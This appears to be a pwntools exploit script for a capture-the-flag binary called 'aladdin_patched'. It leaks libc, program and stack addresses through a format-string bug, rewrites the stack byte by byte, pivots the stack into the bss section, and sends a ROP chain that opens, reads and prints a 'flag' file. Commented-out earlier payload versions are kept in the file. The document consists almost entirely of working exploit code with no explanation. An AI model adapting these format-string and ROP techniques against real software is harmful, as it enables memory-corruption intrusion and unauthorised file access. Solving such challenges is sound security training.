from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
r = process("./aladdin_patched")
libc = ELF("./libc.so.6")
elf  = ELF("./aladdin_patched")

r.sendafter(b"wish:\n", b'%15$p %17$p %7$p ')
libc.address = int(r.recvuntil(b' ').decode(), 16) - 0x29d90
elf.address = int(r.recvuntil(b' ').decode(), 16) - 0x1229
stack_addr = int(r.recvuntil(b' ').decode(), 16)
print(f"libc addr: {hex(libc.address)}")
print(f"elf addr: {hex(elf.address)}")
print(f"stack addr: {hex(stack_addr)}")

# gdb.attach(r, "b *main+0x1393-0x1229\nb main+508-0x1229")
pause()
# b *(main+429)
r.sendafter(b"wish:\n", f"%{(stack_addr+0x38)&0xffff}c%19$hn".encode())
r.sendafter(b"wish:\n", f"%{0x89&0xff}c%49$hhn".encode())

leave_ret = elf.address + 0x1425
pop_rdi = libc.address + 0x2a3e5 # pop rdi ; ret
pop_rsi = libc.address + 0x2be51 # pop rsi ; ret
pop_rdx = libc.address + 0x796a2 # pop rdx ; ret
pop_rax = libc.address + 0x45eb0 # pop rax ; ret
syscall = libc.address + 0x29db4

def write_bytes(addr, value):
    for i in range(8):
        bt = (value>>(i*8))&0xff
        if bt == 0: continue
        r.sendafter(b"wish:\n", f"%{((addr)&0xff)+i}c%19$hhn".encode())
        r.sendafter(b"wish:\n", f"%{bt}c%49$hhn".encode())
        print(f"written byte: {hex(bt)} to address {hex(((addr)&0xff)+i)}")

write_bytes(stack_addr+0x30, elf.sym['wish']+0x10) # pivot the stack to bss section
write_bytes(stack_addr+0x38, leave_ret)
pause()

# payload  = b'one more wish'.ljust(0x10, b'\x00') + b'flag'.ljust(0x8, b'\x00')
# payload += p64(pop_rdi)+p64(elf.sym['wish']+0x10)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
# payload += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack_addr-0x1000)+p64(pop_rdx)+p64(0x50)+p64(pop_rax)+p64(0)+p64(syscall)
# payload += p64(pop_rdi)+p64(1)+p64(pop_rax)+p64(1)+p64(pop_rsi)+p64(stack_addr-0x1000)+p64(pop_rdx)+p64(0x50)+p64(syscall)

rop = ROP(libc)
rop.call("open", [elf.sym['wish']+0x10, 0])
rop.call("read", [3, elf.sym['wish']+0x10, 0x100])
rop.call("write", [1, elf.sym['wish']+0x10, 0x100])
payload = b'one more wish'.ljust(0x10, b'\x00')+b'flag'.ljust(0x8, b'\x00')
payload += rop.chain()
print(f"payload: {payload}")
r.sendafter(b"wish:\n", payload)

r.interactive()

# #rax = 2,open(flag,0,0)
# fini_payload = p64(pop_rax) + p64(pop_rax) + p64(0x2) + p64(pop_rdi)
# fini_payload += p64(ELF_base + 0x3150) + p64(pop_rsi) + p64(0x0)
# fini_payload += p64(pop_rdx) + p64(0x0) + p64(syscall)

# #rax = 0,read(3,stack_adr - 0x1000,30)
# fini_payload += p64(pop_rax) + p64(0x0) + p64(pop_rdi)
# fini_payload += p64(0x3) + p64(pop_rsi) + p64(stack_adr - 0x1000)
# fini_payload += p64(pop_rdx) + p64(0x50) + p64(syscall)
# #rax = 1,write(1,stack_adr - 0x1000,30)
# fini_payload += p64(pop_rax) + p64(0x1) + p64(pop_rdi)
# fini_payload += p64(1) + p64(pop_rsi) + p64(stack_adr - 0x1000)
# fini_payload += p64(pop_rdx) + p64(0x50) + p64(syscall) + b'flag\x00'

# change(stack_adr+0x30, ELF_base+0x3070)
# change(stack_adr+0x38, ELF_base+0x425)

# pause()

# io.recvuntil(b'wish:\n')
# io.send(b'one more wish'.ljust(16, b'\x00') + fini_payload)
# io.interactive()